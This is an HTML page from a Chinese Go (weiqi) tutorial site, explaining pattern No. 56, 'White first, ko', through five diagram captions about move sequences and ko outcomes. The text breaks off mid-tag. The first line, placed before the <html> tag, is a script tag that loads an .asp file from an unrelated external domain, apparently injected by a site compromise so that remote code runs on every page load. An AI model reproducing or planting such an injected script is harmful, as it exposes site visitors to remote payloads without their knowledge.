<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第56型 白先劫</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体"> <h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第56型        白先劫</span></font><!--mstheme--></font></h1> <div align="center">   <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">   <tr>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No56_1.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No56_2.png" width="232" height="232"><!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1靠是好棋。黑2挡时，白3长又是要点，黑4只好扑，白5提成劫。白3如急于在5位扑劫，黑4位提，结果成缓一气劫，白不利。</span></font><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">前图黑4如脱先，白1长，黑成盘角曲四。棋谚云：“盘角曲四，劫尽棋亡”，指的就是这种情况。</span></font>       <p>　<!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No56_3.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center" valign="middle"><!--mstheme--><font face="宋体"> 	<img border="0" src="No56_4.png" width="232" height="232"><!--mstheme--></font></td>    </tr>    <tr>      <td width="45%" valign="top"><!--mstheme--><font face="宋体">        <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>        <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1时，黑2挡大随手。白3扳，黑由于气紧不能在a位遮断，顿死！</span></font></p>       <p>　</p>     <!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图4</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1这边靠，虽也能成劫，却不能令人满意。黑2遮断，白3扳，成黑先提劫。这还不说，白劫胜后，还要a位爬继续打劫，结果是缓一气劫，白失败。</span></font></p>       <p>　</p>     <!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="middle" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No56_5.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="middle" align="center"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="middle" align="center"><!--mstheme--><font face="宋体">       <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>     <!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图5</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">还有更糟的，就是白1的冲。黑2挡，活得干干净净。白</font><font face="黑体">*</font><font face="楷体_GB2312">子等于没有！</span></font></p>     <!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>   </tr> </table><!--mstheme--><font face="宋体"></center> </div> <p align="center"> <!--webbot bot="Navigation" S-Type="arrows" S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE" B-Include-Up="TRUE" U-Page S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a;  } // --></script><script language="JavaScript"><!-- if(MSFPhover) { MSFPnav1n=MSFPpreload("../../../_derived/back_cmp_-1110_back.gif"); MSFPnav1h=MSFPpreload("../../../_derived/back_cmp_-1110_back_a.gif"); } // --></script><a href="../No51/No51.htm" language="JavaScript" onmouseover="if(MSFPhover) document['MSFPnav1'].src=MSFPnav1h.src" onmouseout="if(MSFPhover) document['MSFPnav1'].src=MSFPnav1n.src"><img src="../../../_derived/back_cmp_-1110_back.gif" width="100" height="20" border="0" alt="上一页" align="middle" name="MSFPnav1"></a> <script language="JavaScript"><!-- if(MSFPhover) { MSFPnav2n=MSFPpreload("../../../_derived/up_cmp_-1110_up.gif"); MSFPnav2h=MSFPpreload("../../../_derived/up_cmp_-1110_up_a.gif"); } // --></script><a href="../erxian1.htm" language="JavaScript" onmouseover="if(MSFPhover) document['MSFPnav2'].src=MSFPnav2h.src" onmouseout="if(MSFPhover) document['MSFPnav2'].src=MSFPnav2n.src"><img src="../../../_derived/up_cmp_-1110_up.gif" width="
